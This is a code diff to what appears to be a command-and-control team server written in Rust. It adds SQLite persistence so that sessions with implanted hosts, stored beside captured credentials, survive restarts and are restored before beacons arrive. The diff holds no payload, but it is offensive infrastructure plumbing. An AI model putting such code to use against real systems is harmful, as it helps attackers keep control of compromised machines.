@@ -233,6 +233,29 @@ async fn main() -> anyhow::Result<()> {
         }
     };
 
+    // Session-metadata store: shares the same DB file as the cred + implant
+    // stores. Lets the session registry SURVIVE a team-server restart (previously
+    // in-memory-only → every restart lost every active session). The in-memory
+    // DashMap stays the primary read path; this store is the durability layer.
+    // The persistence handle owns a dedicated background writer thread so the
+    // hot beacon path is NEVER blocked on SQLite.
+    let sessions_db = match nyx_store::SessionStore::open(std::path::Path::new(&creds_path)) {
+        Ok(s) => {
+            let store = Arc::new(s);
+            let persist = nyx_server::SessionPersistence::spawn(store);
+            tracing::info!(db = %creds_path, "session persistence enabled");
+            Some(Arc::new(persist))
+        }
+        Err(e) => {
+            tracing::warn!(
+                error = %e,
+                "failed to open session store; session persistence disabled \
+                 (sessions will be in-memory-only and lost on restart)"
+            );
+            None
+        }
+    };
+
     let mut state = AppState {
         keypair,
         sessions: Default::default(),
@@ -248,6 +271,7 @@ async fn main() -> anyhow::Result<()> {
         template,
         implant_rate_limiter: Default::default(),
         implants: implant_store,
+        sessions_db,
     };
     state.register_default_hooks();
     // Optional operator automation: a Rhai script run on session/result events.
@@ -263,6 +287,15 @@ async fn main() -> anyhow::Result<()> {
         }
     }
     let state = Arc::new(state);
+
+    // Re-hydrate the session registry from the persistent store BEFORE the GC
+    // starts (so the first sweep sees the restored sessions) and before beacons
+    // arrive (so operators see the prior session list immediately). Restored
+    // sessions are flagged `stale` until their first live check-in.
+    let restored = nyx_server::load_persisted_sessions(&state);
+    if restored > 0 {
+        tracing::info!(restored, "session registry restored from persistent store");
+    }
 
     // Start the background session garbage collector (age + idle eviction).
     nyx_server::spawn_session_gc(state.clone());
